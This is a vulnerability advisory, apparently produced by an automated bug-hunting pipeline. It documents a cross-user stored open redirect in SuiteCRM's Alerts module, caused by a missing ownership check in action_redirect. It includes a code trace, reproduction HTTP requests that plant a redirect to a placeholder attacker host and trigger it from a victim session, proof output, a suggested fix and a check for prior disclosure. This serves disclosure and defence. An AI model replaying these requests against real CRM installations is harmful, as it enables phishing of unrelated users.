# VULN-055 — Alerts `action_redirect`: Cross-User Stored Open Redirect

**ID**: VULN-055
**Software**: SuiteCRM — https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (`targets/SuiteCRM/suitecrm_version.php`), commit `62effd0ceb767ed3b634ade585b19a6633eb4fcb`
**Severity**: Medium — **CVSS 3.1 6.1** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**Status**: **CONFIRMED (dynamic)**
**Auth required**: Any authenticated user can plant (`action=add`, on their own alert); any *other* authenticated user's session is hijacked for the redirect (`action=redirect`) — no relationship between the two accounts is required.
**What an attacker gains**: A single, reusable, innocuous-looking CRM link (`action=redirect&record=<id>`) that redirects *any* user who clicks it, and *any number of different victims* off the trusted CRM origin to an attacker-chosen destination — planted once, fired many times, against strangers.

## Summary

SuiteCRM's Alerts notification system lets any user record a "click to see more" URL on an alert they own (`action_add`). The corresponding `action_redirect` handler that dereferences and redirects to that URL loads the Alert bean **by raw id with no ownership or ACL check** — so any authenticated user (not just the alert's owner) who is handed that id is redirected wherever the *original planting user* pointed it. Combined with zero validation of the stored URL itself, this becomes stored, cross-user, reusable open redirect: one attacker account, one crafted link, unlimited victims.

## How it works (mechanism & code trace)

**Plant** — `action_add()` (`modules/Alerts/controller.php:57-129`), reachable via `module=Alerts&action=add` (not a modify-action per `SugarApplication::isModifyAction()` — 'add' isn't prefixed `save`/`delete` and `Alerts` isn't in `modifyModules`, so no Referer/CSRF gate even applies to planting):
```php
if (isset($_POST['url_redirect'])) { $url_redirect = $_POST['url_redirect']; }   // :80-81
...
$bean->url_redirect = $url_redirect;   // :112
$bean->assigned_user_id = $assigned_user_id;   // := $current_user->id, :63
$bean->save();                         // :118
```
The stored value is taken verbatim from `$_POST['url_redirect']`, no validation. This half is scoped to the caller's own account (`assigned_user_id = $current_user->id`), so planting on your own account is not, by itself, a violation of anything.

**Trigger — the actual defect** — `action_redirect()` (`modules/Alerts/controller.php:140-155`):
```php
public function action_redirect()
{
    $bean = BeanFactory::getBean('Alerts', $_GET['record']);   // :142 — no owner check
    $redirect_url = $bean->url_redirect;
    $bean->is_read = 1;
    $bean->save();
    if ($redirect_url) {
        SugarApplication::redirect($redirect_url);              // :148 — stored, unvalidated
    }
    if (!empty($_SERVER['HTTP_REFERER'])) {
        SugarApplication::redirect($_SERVER['HTTP_REFERER']);   // :152 — unfiltered Referer fallback
    }
    SugarApplication::redirect('index.php');
}
```
`BeanFactory::getBean('Alerts', $_GET['record'])` loads **any** alert in the system by id, with no comparison to `$current_user->id` and no `ACLAccess()` check. Contrast with `action_get()` in the same file (`:44-55`), which *does* scope its query to `alerts.assigned_user_id = '$current_user->id'` — proving the codebase knows how to scope this exact bean and simply omits it on this path. `SugarApplication::redirect()` then emits the stored URL as a `Location` header with the same lack of validation documented in VULN-005/VULN-054/VULN-056.

**The defect, pinpointed**: `modules/Alerts/controller.php:142` is missing an ownership check (e.g. `if ($bean->assigned_user_id !== $current_user->id) { ACLController::displayNoAccess(true); }`) before using the loaded bean's `url_redirect`.

## Why it is a vulnerability (reasoning)

The trust boundary here is "a user should only be able to trigger side effects tied to records they own or are permitted to see" — the standard row-level ownership model SuiteCRM otherwise enforces throughout the app (and, as shown, *does* enforce for this very bean type one function away, in `action_get()`). `action_redirect` breaks that invariant twice over: first by not checking ownership at all, second by not validating the destination URL once loaded. Either fix alone would contain the bug (owner-scoping would make it same-user-only; URL validation would make it same-origin-only); the combination — anyone's id, any URL — is what makes it a reusable cross-user phishing primitive rather than a self-inflicted annoyance.

## Reproduction

From a clean state (verified 2026-09-28), two unrelated accounts:

1. **Setup**: admin provisions two independent low-privileged users — attacker `mod_b47e797b` and victim `mod_21c85671` — via the standard admin-editing-another-user flow. They share no team, role, or record relationship.
2. **Plant** (attacker's own authenticated session):
   ```
   POST /index.php?module=Alerts&action=add
   reminder_id=rem_<rand>&url_redirect=https://evil-cvehunter-c055_7edd5dd5.example/redir&name=malicious-reminder&description=planted by attacker
   ```
   → `HTTP 200 {"result":1}`. The new alert's id (`2d117fe9-8915-430c-b59a-76570efa55c9` in this run) is looked up via the `assigned_user_id`-scoped DB row for the attacker (representing what the attacker would see in their own Alerts UI/API).
3. **Attack** (`request.http`) — the **victim's** independent authenticated session, which has never touched the attacker's alert:
   ```
   GET /index.php?module=Alerts&action=redirect&record=2d117fe9-8915-430c-b59a-76570efa55c9 HTTP/1.1
   Host: localhost:33116
   Cookie: (authenticated session of VICTIM, NOT the attacker)
   ```
4. Run `NO_COLOR=1 ./run.sh 2>&1 | tee run.log` — observed output ends:
   ```
   [PROOF] HTTP 301 Moved Permanently
   [PROOF] Location: 'https://evil-cvehunter-c055_7edd5dd5.example/redir'  (victim session, attacker-owned alert id)
   [OK] A user with ZERO relationship to the alert's owner was redirected off-site to the attacker's URL -- action_redirect has no owner/ACL scoping on the record lookup (cross-user IDOR).
   ==> VULN-055: CONFIRMED — victim mod_21c85671 redirected (HTTP 301) to https://evil-cvehunter-c055_7edd5dd5.example/redir via attacker's alert 2d117fe9-8915-430c-b59a-76570efa55c9
   ```
   Exit code `0`.
5. Observable proof: `response.txt` shows `HTTP/1.1 301 Moved Permanently` / `Location:` equal to the attacker's planted URL, served to a session that never created or interacted with that alert. `evidence/plant_alert.txt` records both accounts and the planted id. The DB additionally shows the target alert's `is_read` flipped to `1` (confirming `action_redirect()`'s real code path executed, not a cached/short-circuited response).

## Impact

Any authenticated user — even the lowest-privileged account in the system — can plant a redirect once and distribute the resulting `action=redirect&record=<id>` link (which looks like an internal, harmless "view notification" CRM URL) to arbitrary other users, each of whom is individually redirected off the trusted origin on click. Unlike a one-shot reflected redirect, this is **stored and reusable**: the same link works against every future victim who clicks it, with no re-planting needed. Same open-redirect family as VULN-005, VULN-020, VULN-054, VULN-056. If the separate Referer-echo `<script>` lead in the same handler (`SugarApplication.php:650`/`:660`, fed by `HTTP_REFERER` at `controller.php:151-152`) is confirmed exploitable (flagged NEEDS_MANUAL, not tested here), impact would escalate from phishing to same-origin script execution / session theft.

## Suggested fix

At `modules/Alerts/controller.php:142`, scope the load to the caller:
```php
$bean = BeanFactory::getBean('Alerts', $_GET['record']);
if (empty($bean->id) || $bean->assigned_user_id !== $current_user->id) {
    ACLController::displayNoAccess(true);
    sugar_cleanup(true);
}
```
And, independently, validate `url_redirect` (and drop the unfiltered `HTTP_REFERER` fallback at `:151-152` entirely) as same-origin/relative before emitting a `Location` header — the same fix needed across the whole open-redirect cluster (VULN-005/020/054/056).

## References

- CWE-639: Authorization Bypass Through User-Controlled Key — https://cwe.mitre.org/data/definitions/639.html
- CWE-601: URL Redirection to Untrusted Site ('Open Redirect') — https://cwe.mitre.org/data/definitions/601.html
- OWASP Unvalidated Redirects and Forwards Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- PortSwigger Web Security Academy, "Open redirection" — https://portswigger.net/web-security/dom-based/open-redirection
- GHSA-hcw8-p37h-8hrv / CVE-2026-29105 (open-redirect class) and GHSA-vqrj-gp9m-8c6r (Referer-XSS class, NEEDS_MANUAL lead) — cited by the report as the known-issue matches.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 75 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. `SuiteCRM Alerts "action_redirect" OR "url_redirect" open redirect vulnerability` — no result mentions the Alerts module or either parameter; only WebToLead (CVE-2026-29105), generic (CVE-2024-36406) and Documents-SVG (CVE-2020-15300) redirects.
2. `SuiteCRM Alerts module "action=redirect" record IDOR open redirect CVE` — no relevant results; none of the open-redirect CVEs is described as an IDOR or names Alerts.
3. `SuiteCRM GHSA-2g8f-gjrr-x5cg Alerts` — resolves to CVE-2024-36408, an authenticated SQL injection in the Alerts controller (`reminder_id`), fixed 7.14.4; different sink.
4. `SuiteCRM GHSA-vqrj-gp9m-8c6r Referer XSS` + fetched advisory — CVE-2025-54783, reflected XSS via the HTTP Referer header (fixed 7.14.7 by escaping the host in `checkHTTPReferer()`'s xsrf template); not the Alerts redirect.
5. GitHub commit history of `modules/Alerts/controller.php` (API) — last change is the 7.14.4 release (SQL quoting only); no ownership/ACL check or URL validation has ever been added to `action_redirect()`.
6. v7.14.3..v7.14.4 compare diff (GitHub API) — the "Open redirects" fix (GHSA-hcw8-p37h-8hrv) added `check_trusted_hosts()` and a WebToLead allow-list only.
7. Full SuiteCRM GHSA catalogue (77 published advisories through 2026-10-12) reviewed — no advisory for Alerts beyond the SQLi one; no stored/cross-user redirect advisory.

**Related but distinct public references** (same class or component, not this bug):
- CVE-2024-36408 / GHSA-2g8f-gjrr-x5cg — SQL injection in `modules/Alerts/controller.php::action_add()` (`reminder_id`); same file, different function and sink.
- CVE-2025-54783 / GHSA-vqrj-gp9m-8c6r — reflected XSS via Referer in `SugarApplication::checkHTTPReferer()`; relevant only to the separate NEEDS_MANUAL Referer-echo lead, not to the cross-user redirect.
- CVE-2024-36406 / GHSA-hcw8-p37h-8hrv and CVE-2026-29105 / GHSA-9crg-83cg-wv74 — open redirects in Host-header trust / WebToLead capture; different components.

**Reasoning:** The Alerts controller has only ever received a SQL-injection fix upstream; no public advisory, CVE or issue describes the unscoped `BeanFactory::getBean('Alerts', $_GET['record'])` load in `action_redirect()` or the unvalidated stored `url_redirect`. The open-redirect class is recurrent in SuiteCRM, so a private report may exist, and the WebSearch budget ran out before an additional extended query on "Alerts IDOR" could run, which is why confidence is not higher.
